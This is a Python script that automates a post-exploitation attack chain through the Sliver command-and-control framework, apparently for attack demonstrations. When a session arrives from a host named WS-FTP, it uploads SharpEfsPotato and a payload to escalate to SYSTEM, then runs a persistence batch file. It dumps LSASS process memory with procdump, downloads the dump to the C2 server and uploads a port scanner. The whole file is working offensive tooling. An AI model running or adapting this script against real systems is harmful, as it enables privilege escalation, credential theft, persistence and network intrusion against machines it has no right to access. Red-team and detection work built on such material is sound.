import os
import asyncio
from sliver import SliverClientConfig, SliverClient
import logging
import sys
import shlex

# Configure directory paths and default config file
CONFIG_DIR = os.path.join(os.path.expanduser("/root"), ".sliver-client", "configs")
DEFAULT_CONFIG = os.path.join(CONFIG_DIR, "autosliv.cfg")
valueHostname = "WS-FTP"
initial_access_port = "8888"
privesc_port = "8443"

# file paths for tool and payload uploads
file_paths = {
    "sharpie": "/home/ubuntu/tools/SharpEfsPotato.exe",
    "persist": "/home/ubuntu/scripts/persist.bat",
    "84pr": "/home/ubuntu/payloads/84pr.exe",
    "procdump": "/home/ubuntu/tools/procdump.exe",
    "advancedportscanner": "/home/ubuntu/tools/advancedportscanner.exe"
}


# Set up logging configuration
logger = logging.getLogger(__name__)
stream_handler = logging.StreamHandler(sys.stdout)
file_handler = logging.FileHandler("/home/ubuntu/auto_demos/logs/autosliver.log")
logger.addHandler(file_handler)
logger.addHandler(stream_handler)
formatter = logging.Formatter("[%(asctime)s] %(levelname)s:%(name)s:%(message)s")
stream_handler.setFormatter(formatter)
file_handler.setFormatter(formatter)
logger.setLevel(logging.DEBUG)


async def ws_ftp_exploit(interact):
    await interact.cd("C:\\\\ProgramData\\\\DownloadedFiles")
    await asyncio.sleep(10)

    with open(file_paths["sharpie"], 'rb') as file:
        sharpie_data = file.read()
    await interact.upload("C:\\\\ProgramData\\\\DownloadedFiles\\\\sharpie.exe", sharpie_data)
    await asyncio.sleep(10)

    with open(file_paths["84pr"], 'rb') as file:
        pr_data = file.read()
    await asyncio.sleep(10)
    await interact.upload("C:\\\\ProgramData\\\\DownloadedFiles\\\\84pr.exe", pr_data)

    logger.debug('[*] Launching privesc payload...')
    await interact.execute("C:\\\\ProgramData\\\\DownloadedFiles\\\\sharpie.exe", ["-p", "C:\\\\ProgramData\\\\DownloadedFiles\\\\84pr.exe"], output=False)

async def session_privesc(interact):
    await interact.cd("C:\\\\ProgramData\\\\DownloadedFiles")
    await asyncio.sleep(10)
    with open(file_paths["persist"], 'rb') as file:
        persist_data = file.read()
    await interact.upload("C:\\\\ProgramData\\\\DownloadedFiles\\\\persist.bat", persist_data)
    await asyncio.sleep(10)
    await interact.execute("cmd.exe",["/c C:\\\\ProgramData\\\\DownloadedFiles\\\\persist.bat"], output=False)
    await asyncio.sleep(10)

    with open(file_paths["procdump"], 'rb') as file:
        procdump_data = file.read()
    await interact.upload("C:\\\\ProgramData\\\\DownloadedFiles\\\\procdump.exe", procdump_data)
    await asyncio.sleep(10)
    logger.debug('[*] Executing procdump....')
    await interact.execute("C:\\\\ProgramData\\\\DownloadedFiles\\\\procdump.exe", ["-accepteula","-ma", "lsass.exe","lsass.dmp"], output=False)
    await asyncio.sleep(10)

    logger.debug('[*] Downloading lsass.dmp to Sliver Server...')
    await interact.download("C:\\\\ProgramData\\\\DownloadedFiles\\\\lsass.dmp")

    with open(file_paths["advancedportscanner"], 'rb') as file:
        advancedportscanner_data = file.read()
    logger.debug('[*] Uploading advanced port scanner...')
    await interact.upload("C:\\\\ProgramData\\\\DownloadedFiles\\\\advancedportscanner.exe", advancedportscanner_data)

async def main():
    # Load Sliver client configuration
    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)
    client = SliverClient(config)
    # Connect to the server
    logger.debug('[*] Connected to server ...')
    await client.connect()

    # Listen for session-connected events
    async for event in client.on('session-connected'):
        # Fetch list of sessions
        sessions = await client.sessions()

        # Check if sessions match the specified hostname
        if any(valueHostname in str(session.Hostname) for session in sessions):
            matching_sessions = [session for session in sessions if valueHostname in str(session.Hostname)]
            logger.debug(f"Matching sessions: {matching_sessions}")

            # Interact with matching sessions
            for session in matching_sessions:
                logger.debug('[*] Automatically interacting with session %s', session.ID)
                logger.debug(f'[*] Active C2: {session.ActiveC2}')
                interact = await client.interact_session(session.ID)
                logger.debug('[*] Selecting scenario based on Active C2')

                if initial_access_port in str(session.ActiveC2):
                    logger.debug('[*] Exploiting WS_FTP...')
                    await ws_ftp_exploit(interact)
                    await asyncio.sleep(5)
                    # Attempt to kill the session
                    try:
                        logger.debug(f"[*] Attempting to kill session: {session.ID}")
                        await client.kill_session(session.ID, force=True)
                        logger.debug(f"[*] Attempting to kill session: {session.ID}")
                        await client.kill_session(session.ID, force=True)
                        logger.debug(f"[*] Successfully killed session: {session.ID}")
                    except Exception as e:
                        logger.error("[!] Unable to kill session: %s, Error: %s", session.ID, str(e))

                elif privesc_port in str(session.ActiveC2):
                    logger.debug('[*] SYSTEM access gained, finishing attack...')

                    await session_privesc(interact)
                    await asyncio.sleep(5)

                    # Attempt to kill the session
                    try:
                        logger.debug(f"[*] Attempting to kill session: {session.ID}")
                        await client.kill_session(session.ID, force=True)
                        logger.debug(f"[*] Successfully killed session: {session.ID}")
                    except Exception as e:
                        logger.error("[!] Unable to kill session: %s, Error: %s", session.ID, str(e))
                else:
                    logger.error("[!] Unable to determine Active C2 for session: %s", session.ID)

        else:
            logger.debug(f"{valueHostname} is not connected")

if __name__ == '__main__':
    # Run the main coroutine
    asyncio.run(main())
